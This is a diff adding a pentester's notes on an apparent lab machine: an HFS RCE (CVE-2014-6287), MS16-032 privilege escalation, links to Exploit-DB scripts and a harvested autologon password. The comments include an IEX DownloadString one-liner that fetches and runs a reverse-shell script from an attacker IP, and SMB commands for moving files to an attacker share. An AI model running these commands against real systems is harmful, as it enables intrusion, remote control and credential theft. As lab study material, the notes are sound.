@@ -1,4 +1,37 @@
+OS:
+winpeas_scan.txt
+
+name - Microsoft Windows Server 2012 R2 Standard
+version - 6.3.9600 N/A Build 9600, ms16-032 exploit privesc
+
+
 services:
 
-HFS
-CVE-2014-6287 - RCE command injection w/ search bar
+http 80
+HFS - 2.3.x, cve-2014-6287 RCE command injection w/ search bar
+
+users:
+
+kostas
+pass -  kdeEjDowkS*, from autologon creds winpeas
+
+sources:
+
+https://www.exploit-db.com/exploits/49584 - 49584.py
+HFS exploit
+
+https://www.exploit-db.com/exploits/39719 - 39719.ps1 
+ms16-032 exploit privesc
+
+comments:
+
+powershell wget alternative - (new-object System.Net.WebClient).DownloadFile($url, $path)
+start smbserver - sudo smbserver.py -smb2support -username kek -password uwu share .
+copy to smbserver - net use \\10.10.16.25\share /u:kek uwu; copy file \\10.10.14.6\share\
+check 64 bit windows, important for exploits to work - [Environment]::Is64BitProcess
+if using metasploit can pivot to 64 bit attaching to other running process like explorer.exe
+make sure using full path of powershell if need 64 bit
+always look up exploits for things like OS - kernel exploits!
+watson automatic lookup in peas, but if not run alternates exist like sherlock, metasploit, etc.
+actually understand exploit you download to use, do you have to modify/add command?!
+call command through download - IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.16.25:4444/rshell.ps1')
